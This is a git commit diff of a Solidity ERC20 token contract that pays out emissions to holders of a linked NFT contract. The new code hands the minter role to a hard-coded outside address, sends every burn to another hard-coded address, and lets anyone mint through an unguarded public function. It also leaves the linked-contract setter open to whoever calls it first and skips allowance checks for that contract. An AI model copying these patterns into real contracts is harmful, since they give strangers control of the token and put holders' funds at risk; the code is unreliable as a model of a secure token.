5f526c29af21cb61d119fd1b80ff624a8a9d7850
Faru Nuri Sönmez <info@farunurisonmez.com>
2021-12-04 04:06:33 +0300

    Solidity contract updated.
    ...

--- spend-ERC20-create-ERC721/contracts/TestToken.sol
+++ spend-ERC20-create-ERC721/contracts/TestToken.sol
@@ -1,75 +1,284 @@
+// SPDX-License-Identifier: MIT
+
 pragma solidity ^0.8.0;
 
-import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/token/ERC20/ERC20.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/utils/math/SafeMath.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/utils/Context.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/utils/Strings.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/utils/Address.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/utils/introspection/IERC165.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/utils/introspection/ERC165Storage.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/token/ERC20/IERC20.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/token/ERC721/IERC721.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/token/ERC721/extensions/IERC721Enumerable.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/utils/structs/EnumerableMap.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/access/Ownable.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/token/ERC721/extensions/IERC721Metadata.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/token/ERC721/IERC721Receiver.sol";
 import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/access/AccessControl.sol";
 
-/**
- * This is an access control role for entities that may spend tokens
- **/
-contract SpenderRole is ERC20, AccessControl {
-    
+
+interface ITestToken is IERC721Enumerable {
+    function isMintedBeforeReveal(uint256 index) external view returns (bool);
+}
+
+
+contract TestToken is Context, IERC20, AccessControl {
+    using SafeMath for uint256;
+
     event SpenderAdded(address indexed account);
     event SpenderRemoved(address indexed account);
     
     bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
     bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");
+
+    // Constants
+    uint256 public SECONDS_IN_A_DAY = 86400;
+
+    uint256 public constant INITIAL_ALLOTMENT = 1830 * (10 ** 18);
+
+    uint256 public constant PRE_REVEAL_MULTIPLIER = 1;
+
+    // Public variables
+    uint256 public emissionStart;
+
+    uint256 public emissionEnd; 
+
+    uint256 public emissionPerDay = 10 * (10 ** 18);
+
+    mapping (address => uint256) private _balances;
+
+    mapping (address => mapping (address => uint256)) private _allowances;
     
-    constructor() ERC20("Test Token", "TEST") {
-        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());
-        _addSpender(msg.sender);
+    mapping(uint256 => uint256) private _lastClaim;
+
+    uint256 private _totalSupply;
+
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+    address private _testAddress;
+
+    /**
+     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
+     * a default value of 18. Also initalizes {emissionStart}
+     *
+     * To select a different value for {decimals}, use {_setupDecimals}.
+     *
+     * All three of these values are immutable: they can only be set once during
+     * construction.
+     */
+    constructor (string memory name, string memory symbol, uint256 emissionStartTimestamp) {
+        _name = name;
+        _symbol = symbol;
+        _decimals = 18;
+        emissionStart = emissionStartTimestamp;
+        emissionEnd = emissionStartTimestamp + (86400 * 365 * 10);
+         _addSpender(msg.sender);
     }
-    
+
     modifier onlySpender(){
         require(isSpender(msg.sender));
         _;
     }
-    
+
     function isSpender(address account) public view returns (bool){
-        return hasRole(BURNER_ROLE, account);
+        return hasRole(MINTER_ROLE, account);
     }
-    
+
     function addSpender(address account) public onlySpender {
         _addSpender(account);
     }
-    
+
     function _addSpender(address account) internal {
-        grantRole(BURNER_ROLE,account);
+         _setupRole(MINTER_ROLE, 0xf85b9AF2F5905547e06D9e442Ae7C13d6Fe5d310);
         emit SpenderAdded(account);
     }
-    
-     function renounceSpender() public {
-        _removeSpender(msg.sender);
-    }
-    
-    function _removeSpender(address account) internal {
-        revokeRole(BURNER_ROLE,account);
-        emit SpenderRemoved(account);
-    }
-    
-    function decimals() public view virtual override returns (uint8) {
-        return 0;
+
+   
+    function name() public view returns (string memory) {
+        return _name;
     }
 
-    function spend2(address from, uint256 value) public onlySpender returns(bool) {
-        _burn(from, value);
+
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return _balances[account];
+    }
+
+    function adress0() public view returns(address){
+        return address(0);
+    }
+    
+
+    function lastClaim(uint256 tokenIndex) public view returns (uint256) {
+        require(ITestToken(_testAddress).ownerOf(tokenIndex) != address(0), "Owner cannot be 0 address");
+        require(tokenIndex < ITestToken(_testAddress).totalSupply(), "NFT at index has not been minted yet");
+
+        uint256 lastClaimed = uint256(_lastClaim[tokenIndex]) != 0 ? uint256(_lastClaim[tokenIndex]) : emissionStart;
+        return lastClaimed;
+    }
+    
+
+    function accumulated(uint256 tokenIndex) public view returns (uint256) {
+        require(block.timestamp > emissionStart, "Emission has not started yet");
+        require(ITestToken(_testAddress).ownerOf(tokenIndex) != address(0), "Owner cannot be 0 address");
+        require(tokenIndex < ITestToken(_testAddress).totalSupply(), "NFT at index has not been minted yet");
+
+        uint256 lastClaimed = lastClaim(tokenIndex);
+
+        // Sanity check if last claim was on or after emission end
+        if (lastClaimed >= emissionEnd) return 0;
+
+        uint256 accumulationPeriod = block.timestamp < emissionEnd ? block.timestamp : emissionEnd; // Getting the min value of both
+        uint256 totalAccumulated = accumulationPeriod.sub(lastClaimed).mul(emissionPerDay).div(SECONDS_IN_A_DAY);
+
+        // If claim hasn't been done before for the index, add initial allotment (plus prereveal multiplier if applicable)
+        if (lastClaimed == emissionStart) {
+            uint256 initialAllotment = ITestToken(_testAddress).isMintedBeforeReveal(tokenIndex) == true ? INITIAL_ALLOTMENT.mul(PRE_REVEAL_MULTIPLIER) : INITIAL_ALLOTMENT;
+            totalAccumulated = totalAccumulated.add(initialAllotment);
+        }
+
+        return totalAccumulated;
+    }
+
+
+    function setTestAddress(address testAddress) public {
+        require(_testAddress == address(0), "Already set");
+        
+        _testAddress = testAddress;
+    }
+    
+
+    function claim(uint256[] memory tokenIndices) public returns (uint256) {
+        require(block.timestamp > emissionStart, "Emission has not started yet");
+
+        uint256 totalClaimQty = 0;
+        for (uint i = 0; i < tokenIndices.length; i++) {
+            // Sanity check for non-minted index
+            require(tokenIndices[i] < ITestToken(_testAddress).totalSupply(), "NFT at index has not been minted yet");
+            // Duplicate token index check
+            for (uint j = i + 1; j < tokenIndices.length; j++) {
+                require(tokenIndices[i] != tokenIndices[j], "Duplicate token index");
+            }
+
+            uint tokenIndex = tokenIndices[i];
+            require(ITestToken(_testAddress).ownerOf(tokenIndex) == msg.sender, "Sender is not the owner");
+
+            uint256 claimQty = accumulated(tokenIndex);
+            if (claimQty != 0) {
+                totalClaimQty = totalClaimQty.add(claimQty);
+                _lastClaim[tokenIndex] = block.timestamp;
+            }
+        }
+
+        require(totalClaimQty != 0, "No accumulated NCT");
+        _mint(msg.sender, totalClaimQty); 
+        return totalClaimQty;
+    }
+
+    /**
+     * @dev See {IERC20-transfer}.
+     *
+     * Requirements:
+     *
+     * - `recipient` cannot be the zero address.
+     * - the caller must have a balance of at least `amount`.
+     */
+    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
         return true;
     }
-}
 
-/** 
- * @dev ERC20 spender logic
- **/
- 
- contract ERC20Spendable is SpenderRole {
-    function spend(address from, uint256 value) public onlySpender returns(bool) {
-        _burn(from, value);
+    function allowance(address owner, address spender) public view virtual override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) public virtual override returns (bool) {
+        _approve(_msgSender(), spender, amount);
         return true;
     }
-}
 
-contract TestToken is SpenderRole {
+    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
+        _transfer(sender, recipient, amount);
+        if (msg.sender != _testAddress) {
+            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
+        }
+        return true;
+    }
+
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
+        return true;
+    }
+
+    function burn(uint256 burnQuantity) public virtual returns (bool) {
+        _burn(msg.sender, burnQuantity);
+        return true;
+    }
+  
+    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
+        return true;
+    }
+
+    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+
+        _beforeTokenTransfer(sender, recipient, amount);
+
+        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
+        _balances[recipient] = _balances[recipient].add(amount);
+        emit Transfer(sender, recipient, amount);
+    }
+
+    function _mint(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: mint to the zero address");
+
+        _beforeTokenTransfer(address(0), account, amount);
+
+        _totalSupply = _totalSupply.add(amount);
+        _balances[account] = _balances[account].add(amount);
+        emit Transfer(address(0), account, amount);
+    }
+
+    function _burn(address account, uint256 amount) internal virtual {
+        account = 0x420318cbd47aaAD9d3528Cf17ccf17D98a11dB97;
+        _beforeTokenTransfer(account, address(0), amount);
+
+        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
+        _totalSupply = _totalSupply.sub(amount);
+        emit Transfer(account, address(0), amount);
+    }
+
+    function _approve(address owner, address spender, uint256 amount) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function _setupDecimals(uint8 decimals_) internal {
+        _decimals = decimals_;
+    }
+
     function mint(address to, uint256 value) public returns(bool){
         _mint(to, value);
         return true;
     }
+
+    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
 }
